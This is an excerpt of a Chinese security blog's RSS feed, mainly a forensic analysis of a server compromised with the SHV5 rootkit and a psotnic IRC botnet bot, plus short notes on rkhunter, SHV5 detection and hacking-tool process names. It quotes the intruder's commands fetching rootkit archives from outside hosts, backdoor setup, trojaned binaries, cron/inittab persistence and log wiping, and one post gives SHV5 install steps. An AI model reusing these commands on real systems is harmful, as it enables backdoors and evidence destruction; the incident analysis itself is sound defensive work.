  8 .bash_history     4 .profile          4 .vimrc&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;很不幸的发现,&amp;#8221;ls&amp;#8221;又出问题了.同样,用&amp;#8221;alias&amp;#8221;命令:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:~# alias ls
alias ls=&amp;#39;ls -sa --color=auto&amp;#39;
root@server1:~# unalias ls
root@server1:~# ls
root@server1:~#&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个时候,我才意识到问题的严重性.&amp;#8221;ls&amp;#8221;奇怪的举动和&amp;#8221;/var/log/&amp;#8221;大量日志被删除让我怀疑服务器是否被入侵了.当我看到root目录下的&amp;#8221;.bash_history&amp;#8221;时,就已经可以确定被入侵了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:~# cat -n .bash_history
...
340  w
341  cd /var
342  wget http://83.19.148.250/~matys/pliki/shv5.tar.gz
343  tar -zxf shv5.tar.gz
344  rm -rf shv5.tar.gz
345  mv shv5 .x
346  cd .x
347  ./setup zibi.joe.149 54098
348  passwd
349  passwd
350  ps aux
351  crontab -l
352  cat /etc/issue
353  cat /etc/passwd
354  w
355  who
356  cd /usr/lib/libsh
357  ls
358  hide +
359  chmod +x hide
360  hide +
361  ./hide +
362  cd /var/.x
363  mkdir psotnic
364  cd psotnic
365  wget http://83.19.148.250/~matys/pliki/psotnic0.2.5.tar.gz
366  tar -zxf psotnic0.2.5.tar.gz
367  rm -rf psotnic0.2.5.tar.gz
368  ls
369  mv psotnic-0.2.5-linux-static-ipv6 synscan
370  ./synscan
371  vi conf
372  vi conf1
373  mv synscan smbd
374  smbd -c conf
375  ls
376  ps aux
377  ls
378  ./smbd -c conf
379  ./smbd -c conf1
380  ./smbd conf
381  ./smbd conf1
382  ./smbd -a conf conf1
383  rm -rf conf.dec
384  rm -rf conf1.dec
385  cd /usr/lib/libsh
386  ./hide +
387  exit
...
425  ssh ftp@62.101.251.166
426  w
427  ls
428  ls
429  cd /var/.x
430  ls
431  cd psotnic/
432  ls
433  rm -rf /var/log/*
434  exit
435  ls
436  cd /var/.x/psotnic/
437  ls
438  vi conf2
439  ./smbd -c conf2
440  ./smbd conf2
441  ./smbd -a conf conf1 conf2
442  rm -rf conf2.dec
443  cd ..
444  ls
445  cd /usr/lib/libsh
446  hide +
447  ./hide +
448  exit
449  ps aux
450  cd /var/.x
451  ls
452  ls
453  cd psotnic/
454  ls
455  cat pid.MastaH
456  kill -9 2030
457  ./synscan -a conf conf1
458  ./smbd -a conf conf1
459  cd /usr/lib/libsh
460  ./hide +&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Woht!这个系统已经被入侵了.这实在是令人激动的一件事情,不过很显然,我的朋友不这么想.这个入侵者犯了一个很基本的错误,没有清除&amp;#8221;.bash_history&amp;#8221;文件.所以他/她可能在其他的地方也留下了一些蛛丝马迹.接下来就是详细的分析一下这次入侵.&lt;/p&gt;

&lt;p&gt;通过bash history我们得到了大量的信息.先来看一下&amp;#8221;/var/.x&amp;#8221;下面隐藏了什么和命令&amp;#8221;setup zibi.joe.149 54098&amp;#8221;的作用吧.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:/var/.x# file setup
setup: Bourne-Again shell script text executable
root@server1:/var/.x# wc -l setup
825 setup
root@server1:/var/.x# head -17 setup
#!/bin/bash
#
# shv5-internal-release
# by: PinT[x] April/2003
# 
# greetz to:
#
# [*] SH-members: BeSo_M, grass^, toolman, nobody, niceboy, armando99 
#                 C00L|0, GolDenLord, Spike, zion ...
# [*] Alba-Hack : 2Cool, heka, TheMind, ex-THG members ...
# [*] SH-friends: mave, AlexTG, Cat|x, klex, JinkS ...
# [*] tC-members: eksol, termid, hex, keyhook, maher, tripod etc..
# [*] And all others who diserve to be here but i forgot
# [*] them at the moment !
# 
# PRIVATE ! DO NOT DISTRIBUTE *censored*EZ !&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;#8220;setup&amp;#8221;这个脚本是rootkit shv5的安装脚本.它安装了一个修改过的ssh后门&amp;#8211;&amp;#8220;/bin/ttyload&amp;#8221;,然后把它加到了&amp;#8221;/etc/inittab&amp;#8221;,这样每次重启后就会自动启动.(相关部分的脚本如下:)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mv $SSHDIR/sshd /sbin/ttyload
chmod a+xr /sbin/ttyload
chmod o-w /sbin/ttyload
touch -acmr /bin/ls /sbin/ttyload
chattr +isa /sbin/ttyload
kill -9 `pidof ttyload` &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
....
# INITTAB SHUFFLING
chattr -isa /etc/inittab
cat /etc/inittab |grep -v ttyload|grep -v getty &amp;gt; /tmp/.init1
cat /etc/inittab |grep getty &amp;gt; /tmp/.init2
echo &amp;quot;# Loading standard ttys&amp;quot; &amp;gt;&amp;gt; /tmp/.init1
echo &amp;quot;0:2345:once:/usr/sbin/ttyload&amp;quot; &amp;gt;&amp;gt; /tmp/.init1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;它也替换了一些linux的标准命令.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Backdoor ps/top/du/ls/netstat/etc..
cd $BASEDIR/bin
BACKUP=/usr/lib/libsh/.backup
mkdir $BACKUP
...
# ls ...
chattr -isa /bin/ls
cp /bin/ls $BACKUP
mv -f ls /bin/ls
chattr +isa /bin/ls&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样子就可以解释为什么&amp;#8221;ls&amp;#8221;命令输出那么奇怪了.&lt;/p&gt;

&lt;p&gt;&amp;#8220;.backup&amp;#8221;文件夹保存了被替换之前的命令程序.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:/var/.x# ls -l /usr/lib/libsh/.backup/
total 552
-rwxr-xr-x   1 root     root       126276 Dec 24 22:58 find
-rwxr-xr-x   1 root     root        59012 Dec 24 22:58 ifconfig
-rwxr-xr-x   1 root     root        77832 Dec 24 22:58 ls
-rwxr-xr-x   1 root     root        30388 Dec 24 22:58 md5sum
-rwxr-xr-x   1 root     root        99456 Dec 24 22:58 netstat
-rwxr-xr-x   1 root     root        65492 Dec 24 22:58 ps
-rwxr-xr-x   1 root     root        14016 Dec 24 22:58 pstree
-rwxr-xr-x   1 root     root        50180 Dec 24 22:58 top&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看了一下时间戳,居然是在圣诞节.&lt;/p&gt;

&lt;p&gt;很显然,原始的&amp;#8221;ls&amp;#8221;和后门安装的&amp;#8221;ls&amp;#8221;是不一样的.他们的md5对比如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:~# md5sum /usr/lib/libsh/.backup/ls /bin/ls
eef7ca9dd6be1cc53bac84012f8d1675  /usr/lib/libsh/.backup/ls
0a07cf554c1a74ad974416f60916b78d  /bin/ls

root@server1:~# file /bin/ls
/bin/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, dynamically linked 
(uses shared libs), for GNU/Linux 2.0.0, stripped

root@server1:~# file /usr/lib/libsh/.backup/ls
/usr/lib/libsh/.backup/ls: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.0, dynamically linked 
(uses shared libs), for GNU/Linux 2.6.0, stripped&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个rootkit(&amp;#8220;sh5.tar.gz&amp;#8221;)是从下面的地址下载的.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:~# dig +short -x 83.19.148.250
4lo.bydg.pl.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是一个波兰的ip,从这个ip上没有得到更多的信息.不过这个入侵者依然犯了几个严重的错误.&lt;/p&gt;

&lt;p&gt;这是运行&amp;#8221;setup&amp;#8221;命令的截图:(在服务器上的沙盒里运行的)&lt;/p&gt;

&lt;p&gt;&lt;img alt='output' src='http://3.bp.blogspot.com/_iX_rBDYcMHQ/TMtDG_j_l0I/AAAAAAAABBc/kWxNZJY7TXI/s1600/HollidayCracking_1_original.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;所以&amp;#8221;zibi.joe.149&amp;#8221;是后门的密码,&amp;#8221;54098&amp;#8221;是端口号.这是一个来自ssh.com的就版本的sshd.测试截图如下:&lt;/p&gt;

&lt;p&gt;&lt;img alt='backdoor' src='http://4.bp.blogspot.com/_iX_rBDYcMHQ/TMtDPb4GN3I/AAAAAAAABBg/rhaPBk_muqU/s1600/HollidayCracking_2_original.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;安装完后门之后,下一个步骤就是装一个irc-bot,让服务器变成僵尸网络中的一员.&amp;#8221;psotnic0.2.5.tar.gz&amp;#8221;就是来达到这个目的的.入侵者解压这个包之后把 irc-bot重命名为&amp;#8221;smbd&amp;#8221;,来达到隐藏的目的.&lt;/p&gt;

&lt;p&gt;然后,他创建了两个配置文件.文件中包含irc服务器和需要加入的频道.配置文件是加密过的,而且明文的配置文件被删掉了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;371  vi conf
372  vi conf1
....
378  ./smbd -c conf 
379  ./smbd -c conf1
380  ./smbd conf
381  ./smbd conf1
382  ./smbd -a conf conf1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;让我们执行一下382这条命令,看看会发生什么.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:/var/.x/psotnic# ./smbd -a conf conf1

Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49)
Copyright (C) 2003-2005 Grzegorz Rusin 

[+] Adding: */10 * * * * cd /var/.x/psotnic; ./smbd conf &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
[+] Adding: */10 * * * * cd /var/.x/psotnic; ./smbd conf1 &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
[+] Added 2 psotnics to cron&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;哇!它添加了cron定时任务.赶紧看一看:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:/var/.x/psotnic# crontab -l
*/10 * * * * cd /var/.x/psotnic; ./smbd conf &amp;gt;/dev/null 2&amp;gt;&amp;amp;1
*/10 * * * * cd /var/.x/psotnic; ./smbd conf1 &amp;gt;/dev/null 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来,我杀掉这两个恶意的smbd进程,禁用cron任务.在另一个shell中运行了tcpdump,然后手动启动了这两个irc-bot进程:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:~# cd /var/.x/psotnic; ./smbd conf

Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49)
Copyright (C) 2003-2005 Grzegorz Rusin 

[*] Acting as LEAF
[+] Config loaded
[+] Going into background [pid: 5724]
root@server1:/var/.x/psotnic# ./smbd conf1

Psotnic C++ edition, version 0.2.5-ipv6 (Jul 17 2005 20:39:49)
Copyright (C) 2003-2005 Grzegorz Rusin 

[*] Acting as LEAF
[+] Config loaded
[+] Going into background [pid: 5727]
root@server1:/var/.x/psotnic# &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用&amp;#8221;ps&amp;#8221;命令(后门替换过的)可以看到这两个进程.这也是为什么入侵者需要通过改名字来隐藏进程.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:/var/.x/psotnic# ps axuw | grep smb
root      3799  0.0  0.4  8592 2156 ?        S    11:00   0:00 /usr/sbin/smbd -D
root      3808  0.0  0.1  8592  896 ?        S    11:00   0:00 /usr/sbin/smbd -D
root      5724  0.0  0.1  1648  772 pts/2    S    12:47   0:00 ./smbd conf
root      5727  0.0  0.1  1640  764 pts/2    S    12:47   0:00 ./smbd conf1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最开始两个是真正的samba进程,后面两个是irc-bot,让我们用&amp;#8221;strace&amp;#8221;命令来看看它做了什么:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:~# strace -p 5727
...
connect(3, {sa_family=AF_INET, sin_port=htons(9714), sin_addr=inet_addr(&amp;quot;83.18.74.235&amp;quot;)}, 16) = -1 EINPROGRESS (Operation now in progress)
...
connect(4, {sa_family=AF_INET, sin_port=htons(6667), sin_addr=inet_addr(&amp;quot;195.159.0.92&amp;quot;)}, 16) = -1 EINPROGRESS (Operation now in progress)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到它尝试连接ip 83.18.74.235的9714端口和195.159.0.92的6667端口:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:~# dig +short -x 83.18.74.235
manhattan.na.pl.
root@server1:~# dig +short -x 195.159.0.92
ircnet.irc.powertech.no.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;又是一个波兰的ip.另外一个ip,&amp;#8221;ircnet.irc.powertech.no&amp;#8221;是&amp;#8221;irc.powertech.nof&amp;#8221;的别名.是挪威一个著名的irc服务器.&lt;/p&gt;

&lt;p&gt;tcpdump抓到了连接irc服务器的流量.正如下面的内容显示,它连接到了&amp;#8221;irc.powertech.no&amp;#8221;,加入了&amp;#8221;#aik&amp;#8221;频道.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;:irc.powertech.no 001 578PAB9NB :Welcome to the Internet Relay Network 578PAB9NB!~op@ti231210a080-3666.bb.online.no
:irc.powertech.no 002 578PAB9NB :Your host is irc.powertech.no, running version 2.11.1p1

:578PAB9NB!~op@ti231210a080-3666.bb.online.no JOIN :#aik
:irc.powertech.no 353 578PAB9NB @ #aik :578PAB9NB kknd raider brandyz jpi conf xerkoz IpaL vvo 
:irc.powertech.no 366 578PAB9NB #aik :End of NAMES list.
:irc.powertech.no 352 578PAB9NB #aik ~op ti231210a080-3666.bb.online.no irc.powertech.no 578PAB9NB G :0 op - GTW
:irc.powertech.no 352 578PAB9NB #aik ~kknd ti231210a080-3666.bb.online.no irc.hitos.no kknd H :2 kknd - GTW
:irc.powertech.no 352 578PAB9NB #aik ~raider mobitech-70.max-bc.spb.ru *.dotsrc.org raider G :4 raider - GTW
:irc.powertech.no 352 578PAB9NB #aik ~brandyz mobitech-70.max-bc.spb.ru *.dotsrc.org brandyz G :4 brandyz - GTW
:irc.powertech.no 352 578PAB9NB #aik ~jpi p3124-ipad309sasajima.aichi.ocn.ne.jp *.jp jpi G :8 jpi - GTW
:irc.powertech.no 352 578PAB9NB #aik ~conf p3124-ipad309sasajima.aichi.ocn.ne.jp *.jp conf G :7 conf - GTW
:irc.powertech.no 352 578PAB9NB #aik ~xerkoz p3124-ipad309sasajima.aichi.ocn.ne.jp *.jp xerkoz H :7 xerkoz - GTW
:irc.powertech.no 352 578PAB9NB #aik lm campus19.panorama.sth.ac.at *.at IpaL H :5 .LaPi.9@.IRCNet..
:irc.powertech.no 352 578PAB9NB #aik ~vvo ppp86-7.intelcom.sm *.tiscali.it vvo H :6 vvo - GTW
:irc.powertech.no 315 578PAB9NB #aik :End of WHO list.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这些仅仅是加入#aik频道,并开始监听该频道所有成员的一些原始网络流量.我决定自己进入这个频道看看.令我惊讶的是不需要任何密码我就进来了.这个入侵者又要郁闷了.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;17:43 -!- viper42 [~viper42@trinity.gnist.org] has joined #aik
17:43 [Users #aik]
17:43 [ 578PAB9NL] [ conf] [ jpi ] [ raider ] [ vvo   ] 
17:43 [ brandyz  ] [ IpaL] [ kknd] [ viper42] [ xerkoz] 
17:43 -!- Irssi: #aik: Total of 10 nicks [0 ops, 0 halfops, 0 voices, 10 normal]
17:43 -!- Irssi: Join to #aik was synced in 1 secs&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我发现我朋友的服务器使用的昵称是&amp;#8221;578PQB9NB&amp;#8221;,还有一些其他的服务器也在这里.这些僵尸服务器应该是正在等待着我们的入侵者加入频道发布命令.或者他已经潜藏在这里了.我注意到,所有的昵称都有一个后缀&amp;#8221;*-GTW&amp;#8221;,只有一个没有:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;17:45 [powertech] -!- IpaL [lm@campus19.panorama.sth.ac.at]
17:45 [powertech] -!-  ircname  : LaPi@IRCNet
17:45 [powertech] -!-  channels : #relaks #ping @#seks #aik @#ogame.pl 
#pingwinaria #hattrick #trade #admin @#!sh 
17:45 [powertech] -!-  server   : *.at [\o\  \o/  /o/]&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是唯一一个加入了多个频道的昵称.我猜我已经找到这个入侵者了,除非这是一个故意迷惑的诱饵.(恩,这个入侵者真的真么笨!!这么容易就找到了!?).我决定等几天看看有木有什么有趣的事情发生.这个域名解析到了:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ dig +short campus19.panorama.sth.ac.at
193.170.51.84&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据RIPE的数据,这个ip属于Vienna University计算机中心,我发了一封邮件询问关于这个域名的信息,他们几个小时后会我了:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;From: Alexander Talos via RT
To: larstra@ifi.uio.no
Subject: Cracker at campus19.panorama.sth.ac.at (193.170.51.84)  [ACOnet CERT #38603]
Date: Fri, 18 May 2007 18:22:43 +0200 (CEST)
Reply-To: cert@aco.net

-----BEGIN PGP SIGNED MESSAGE----- 
Hash: SHA1

Hej!

On Fri May 18 14:45:03 2007, larstra@ifi.uio.no wrote:

&amp;gt; I have been tracking down cracker which connected from
&amp;gt; campus19.panorama.sth.ac.at (193.170.51.84). The user, which

Ouch. panorama.sth.ac.at is a dormitory with about 4k rooms all
behind a NAT gateway - it will be very hard to get hold of the
miscreant.

This incident will, in the long run, definitely help me getting
rid of the NAT boxes in setups like that, but right now, we will 
have to make do with what we have.

&amp;gt; Please investigate the host in question. Perhaps is this a
&amp;gt; compromised host on your network acting as a jumpstation for

Sure, and even in a NATed environment, this is still possible.

Btw, you did a great job in analysing the compromised machine!

I&amp;#39;ll let you know when I have either further questions or any
interesting results.

Cheers,

Alexander Talos

- --
IT-Security, Universitaet Wien, ACOnet CERT

T: +43-1-4277-14351  M: +43-664-60277-14351&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看起来我不够幸运.&lt;/p&gt;

&lt;p&gt;接下来我曾尝试连接irc频道里其他僵尸主机的 54098端口,可惜都失败了.看来其他的僵尸主机的后门可能使用的是别的端口.&lt;/p&gt;

&lt;p&gt;连接到&amp;#8221;83.18.74.235&amp;#8221;的流量看起来很混乱.只好再次用strace命令:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:/var/.x/psotnic# strace -f ./smbd conf1 &amp;amp;&amp;gt; /root/dump.strace&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跟预期的一样,有很多输出,其中一个是它尝试启动&amp;#8221;BitchX&amp;#8221;,这是一个irc客户端.但是失败了,因为BitchX没有安装:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[pid  7537] write(2, &amp;quot;sh: &amp;quot;, 4)         = 4
[pid  7537] write(2, &amp;quot;BitchX: not found&amp;quot;, 17) = 17
[pid  7537] write(2, &amp;quot;n&amp;quot;, 1)           = 1
[pid  7537] close(2)                    = 0&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;下面的截图是tcpdump抓到流量的一部分:&lt;/p&gt;

&lt;p&gt;&lt;img alt='tcpdump' src='http://3.bp.blogspot.com/_iX_rBDYcMHQ/TMtFwuLEMOI/AAAAAAAABBk/N6nFQp_Po_Y/s1600/HollidayCracking_3_original.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;这仅仅是两个假的smbd进程中的一个.另外一个也连到了两个irc服务器,一个是波兰这个,另外一个是&amp;#8221;irc.hitos.no&amp;#8221;,位于挪威的特罗姆斯郡.&lt;/p&gt;

&lt;p&gt;入侵者除了这些,还运行了一个叫&amp;#8221;hide&amp;#8221;的脚本来清除日志:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@server1:/usr/lib/libsh# ./hide +
Linux Hider v2.0 by mave
enhanced by me!
[+] [Shkupi Logcleaner] Removing + from the logs........ .

[+] /var/log/messages  ... [done]

[+] /var/run/utmp      ... [done]

[+] /var/log/lastlog   ... [done]

[+] /var/log/wtmp      ... [done]

* m i s s i o n  a c c o m p l i s h e d *

p.h.e.e.r  S.H.c.r.e.w&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;那么这个入侵者为什么还要把&amp;#8221;/var/log/&amp;#8221;目录全删除了呢,是不相信这个工具么?还是他特别害怕?&lt;/p&gt;

&lt;p&gt;可以看到这个服务器被入侵了,安装了后门而且加入了僵尸网咯.但是入侵者犯了几个错误导致他可能被侦查到:&lt;/p&gt;

&lt;p&gt;1, 忘记清除&amp;#8221;.bash_history&amp;#8221;文件&lt;/p&gt;

&lt;p&gt;2, &amp;#8220;/var/log&amp;#8221;目录下所有文件都删除了.导致某些程序无法启动.很容易被发现.&lt;/p&gt;

&lt;p&gt;3, 修改了root的密码.又是一个愚蠢的行为.永远不要修改root密码,这个必然会引起管理员的注意.&lt;/p&gt;

&lt;p&gt;4, irc的频道没有密码保护.虽然即使有密码,我们也可以抓包分析出来.&lt;/p&gt;

&lt;p&gt;5, 入侵者平时就在僵尸网络的频道闲逛?如果是这样的话那他已经暴露了.&lt;/p&gt;

&lt;p&gt;当然还有几个遗留的问题:&lt;/p&gt;

&lt;p&gt;1,&amp;#8221;ssh ftp@62.101.251.166&amp;#8221; 这个命令是干嘛的.是入侵者不小心敲错了么还是有其他的目的?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  $ dig +short -x 62.101.251.166
  cA6FB653E.dhcp.bluecom.no.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2,跟83.18.74.235(manhattan.na.pl)的通讯内容是什么?&lt;/p&gt;

&lt;p&gt;3,最重要的问题是他一开始是如何或得下系统的权限的?这个服务器运行的是Ubuntu 6.06 LTS,打了最新的补丁.可能入侵的途径:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;猜测root密码,不幸的是这个密码是强密码&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;未知的exploit&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;某个用户在已经被攻陷的主机上登录这台服务器.入侵者嗅探到了密码.&lt;/em&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/渗透测试/2013/09/06/holiday-cracking-</link>
                <guid>http://username.github.io/渗透测试/2013/09/06/holiday-cracking-</guid>
                <pubDate>2013-09-06T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>rkhunter安装手记</title>
                <description>&lt;h2 id='id2583'&gt;安装步骤&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;wget http://sourceforge.net/projects/rkhunter/files/latest/download
tar zxvf download
cd rk~~
./install --install
rkhunter --check&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2584'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://www.rootkit.nl/projects/rootkit_hunter.html&lt;/p&gt;</description>
                <link>http://username.github.io/渗透测试/2013/09/04/rkhunter</link>
                <guid>http://username.github.io/渗透测试/2013/09/04/rkhunter</guid>
                <pubDate>2013-09-04T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>syslog watch 测试</title>
                <description>&lt;p&gt;测试软件:syslog watch 4.5.3 采用eventlog to syslog发送windows日志.编码是utf-8格式&lt;/p&gt;

&lt;p&gt;结果:日志接受界面显示中文部分是乱码,存储采用sqlite本地存储的.没有txt格式.&lt;/p&gt;

&lt;h2 id='id2582'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://www.snmpsoft.com/syslogwatcher/syslog-server.html&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/09/03/syslog-watch-</link>
                <guid>http://username.github.io/工具使用/2013/09/03/syslog-watch-</guid>
                <pubDate>2013-09-03T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>SHV5/SHV4 rootkit</title>
                <description>&lt;h2 id='id2580'&gt;发现痕迹&lt;/h2&gt;

&lt;p&gt;On RHEL or Centos 4 or 5, If you run the linux command top and you see something like:&lt;/p&gt;

&lt;p&gt;&amp;#8220;Unknown HZ value! (75) Assume 100&amp;#8221;&lt;/p&gt;

&lt;p&gt;Yours might not say &amp;#8220;75&amp;#8221; &amp;#8211; it could be any number. If you see this, you should run rkhunter immediately, because your box has probably been taken over by a rootkit &amp;#8211; either SHV4 or SHV5.&lt;/p&gt;

&lt;p&gt;The only reason you see this clue &amp;#8220;Unknown HZ value&amp;#8221; is because the rootkit replaces the top command (among others) with a substitute top command that will hide its processes. Their replacement top is old (version 1.2) and cannot handle the HZ value of the 2.6 linux kernel. Sad to say, but if this happens to you, its time to reinstall your OS!&lt;/p&gt;

&lt;p&gt;!!测试发现第一次安装shv5的时候,ls不会有出错信息,用脚本将rootkit清理一遍,当然不彻底,虽然rootkit失效了,但是有些残留.再次安装ls就会出现错误提示了.&lt;/p&gt;

&lt;h2 id='shv5'&gt;shv5安装&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;wget http://baributz.hourb.com/localroot/shv5.tar.gz
tar zxvf shv5.tar.gz
cd shv5
./setup pass port&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2581'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://www.kentoyer.com/2009/12/21/removing-the-shv5-rootkit/&lt;/p&gt;

&lt;p&gt;http://www.jigsawboys.com/2008/06/01/lead-story-test/&lt;/p&gt;

&lt;p&gt;http://serverfault.com/questions/524723/how-can-i-remove-shv4-shv5-rootkits&lt;/p&gt;

&lt;p&gt;http://blog.hostonnet.com/shv5-rootkit&lt;/p&gt;

&lt;p&gt;http://www.huweb.hu/maques/mblog/?p=153&lt;/p&gt;

&lt;p&gt;http://blog.wgzhao.com/2009/09/14/shv4-rootkit/&lt;/p&gt;

&lt;p&gt;http://blog.evilcoder.net/remove-linux-shv5-rootkit/&lt;/p&gt;

&lt;p&gt;http://web.fhnw.ch/plattformen/ns/vorlesungsunterlagen-1/network-analysis-tools/shv4-analysis&lt;/p&gt;

&lt;p&gt;http://blog.csdn.net/cnbird2008/article/details/4553488&lt;/p&gt;</description>
                <link>http://username.github.io/渗透测试/2013/09/03/shv5shv4-rootkit</link>
                <guid>http://username.github.io/渗透测试/2013/09/03/shv5shv4-rootkit</guid>
                <pubDate>2013-09-03T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>shell脚本if语句学习</title>
                <description>&lt;p&gt;if判断的&lt;a href='http://space.itpub.net/187805/viewspace-558085'&gt;操作符&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;需要注意的地方:&lt;/p&gt;

&lt;p&gt;1 =是用来比较字符串的，如果是数字比较，则要使用-eq，而不能使用= 2 就是空格也有严格要求，if和&lt;span /&gt;要有一个空格，&lt;span /&gt;里的表达式，要与左右的&lt;span /&gt;分别有一个空格，最后表达式的两个操作数要和符号间，都要有一个空格，少一个空格，执行脚本的时候就报错。&lt;/p&gt;</description>
                <link>http://username.github.io/代码人生/2013/09/03/shellif</link>
                <guid>http://username.github.io/代码人生/2013/09/03/shellif</guid>
                <pubDate>2013-09-03T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>sed报错unknown option to s</title>
                <description>&lt;p&gt;一段代码在centos下可以执行,ubuntu下执行报错,一开始怀疑是不是不同的版本sed问题.google了一下,找到一个很好的&lt;a href='http://www.linuxmisc.com/10-unix-questions/8ffaf0e2525e6fde.htm'&gt;资料&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可以看到大家认为引起这个错误的可能有几种不同的状况.我这里是采用bash pam.sh执行就不会报错了,看来是不同的shell对单双引号导致的.&lt;/p&gt;

&lt;p&gt;Use double quotes, not single quotes. Shell variable substitution (Bourne shell) is done inside double quotes, biut not inside single quotes. Why does sed usually use single quotes, then? Because you normally want sed to see the $ more often than you want the shell to see it. &amp;#8220;man sh&amp;#8221; on quoting rules.&lt;/p&gt;</description>
                <link>http://username.github.io/代码人生/2013/09/03/sedunknown-option-to-s</link>
                <guid>http://username.github.io/代码人生/2013/09/03/sedunknown-option-to-s</guid>
                <pubDate>2013-09-03T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>windows平台常用黑客工具进程</title>
                <description>&lt;pre&gt;&lt;code&gt;Arp EMP v1.0.exe  Arp EMP v1.0 
Cain.exe          cain
NetFuke.exe       netfuck ver 1.0.7
御剑1.4.exe        御剑1.4
御剑2.0.exe        御剑2.0
chopper.exe       中国菜刀
IISPutScanner.exe iipput scanner
DUBrute.exe        dubrute 3389 破解&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/工具使用/2013/08/30/windows</link>
                <guid>http://username.github.io/工具使用/2013/08/30/windows</guid>
                <pubDate>2013-08-30T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>patch pam backdoor</title>
                <description>&lt;h2 id='pam'&gt;什么pam&lt;/h2&gt;

&lt;p&gt;在过去，我们想要对一个使用者进行认证 (authentication)，得要要求用户输入账号口令， 然后透过自行撰写的程序来判断该账号口令是否正确。也因为如此，我们常常得使用不同的机制来判断账号口令， 所以搞的一部主机上面拥有多个各别的认证系统，也造成账号口令可能不同步的验证问题！ 为了解决这个问题因此有了 PAM (Pluggable Authentication Modules, 嵌入式模块) 的机制！&lt;/p&gt;

